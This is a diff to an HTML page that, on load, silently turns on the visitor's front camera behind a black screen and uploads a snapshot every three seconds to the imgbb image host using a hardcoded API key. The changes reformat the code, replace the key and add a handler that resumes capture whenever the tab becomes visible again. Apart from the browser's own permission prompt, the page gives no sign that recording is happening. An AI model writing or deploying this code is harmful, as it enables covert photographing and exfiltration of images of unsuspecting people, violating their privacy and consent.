@@ -1,80 +1,87 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Continuous Image Upload</title>
-<style>
-    body {
-        margin: 0;
-        padding: 0;
-        background-color: #000;
-        overflow: hidden;
-    }
-    #video {
-        display: none;
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Continuous Image Upload</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            overflow: hidden;
+        }
+        #video {
+            display: none;
+        }
+    </style>
 </head>
 <body>
 <video id="video" autoplay></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
+    let captureInterval;
+
     function startCapturingAndUploading() {
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // This line specifies the front camera
-        .then(function(stream) {
-            var video = document.getElementById('video');
-            video.srcObject = stream;
-            video.play();
-            var canvas = document.getElementById('canvas');
-            var context = canvas.getContext('2d');
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // Use front camera
+            .then(function(stream) {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
 
-            function captureAndUpload() {
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                var imageData = canvas.toDataURL('image/jpeg');
+                function captureAndUpload() {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/jpeg');
 
-                var formData = new FormData();
-                formData.append('image', dataURItoBlob(imageData));
+                    const formData = new FormData();
+                    formData.append('image', dataURItoBlob(imageData));
 
-                fetch('https://api.imgbb.com/1/upload?key=35a3260fbc62e08e2e166da6d9574ddc', {
-                    method: 'POST',
-                    body: formData,
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.data) {
-                        document.body.style.backgroundColor = "#000"; // Reset background color to black
-                        setTimeout(captureAndUpload, 3000); // Capture and upload every 3 seconds
-                    } else {
-                        console.log('Failed to upload image. Retrying...');
-                        setTimeout(captureAndUpload, 3000); // Retry after 3 seconds
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    setTimeout(captureAndUpload, 3000); // Retry after 3 seconds
-                });
-            }
-
-            function dataURItoBlob(dataURI) {
-                var byteString = atob(dataURI.split(',')[1]);
-                var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-                var ab = new ArrayBuffer(byteString.length);
-                var ia = new Uint8Array(ab);
-                for (var i = 0; i < byteString.length; i++) {
-                    ia[i] = byteString.charCodeAt(i);
+                    fetch('https://api.imgbb.com/1/upload?key=bc0128afc43bdda4d55e79c3781728ac', {
+                        method: 'POST',
+                        body: formData,
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.data) {
+                            console.log('Upload successful:', data.data.url);
+                            // Consider adding a vibration here if it's critical, but note that it requires user interaction to start.
+                        } else {
+                            console.log('Failed to upload image. Retrying...');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                    });
                 }
-                var blob = new Blob([ab], { type: mimeString });
-                return blob;
-            }
 
-            captureAndUpload(); // Start capturing and uploading images
-        })
-        .catch(function(err) {
-            console.error('Error accessing the camera: ', err);
-        });
+                function dataURItoBlob(dataURI) {
+                    const byteString = atob(dataURI.split(',')[1]);
+                    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+                    const ab = new ArrayBuffer(byteString.length);
+                    const ia = new Uint8Array(ab);
+                    for (let i = 0; i < byteString.length; i++) {
+                        ia[i] = byteString.charCodeAt(i);
+                    }
+                    return new Blob([ab], {type: mimeString});
+                }
+
+                captureInterval = setInterval(captureAndUpload, 3000); // Adjust time as needed
+            })
+            .catch(function(err) {
+                console.error('Error accessing the camera: ', err);
+            });
     }
+
+    document.addEventListener("visibilitychange", function() {
+        if (document.visibilityState === 'hidden') {
+            clearInterval(captureInterval);
+        } else {
+            startCapturingAndUploading();
+        }
+    });
 
     startCapturingAndUploading(); // Start the process automatically
 </script>
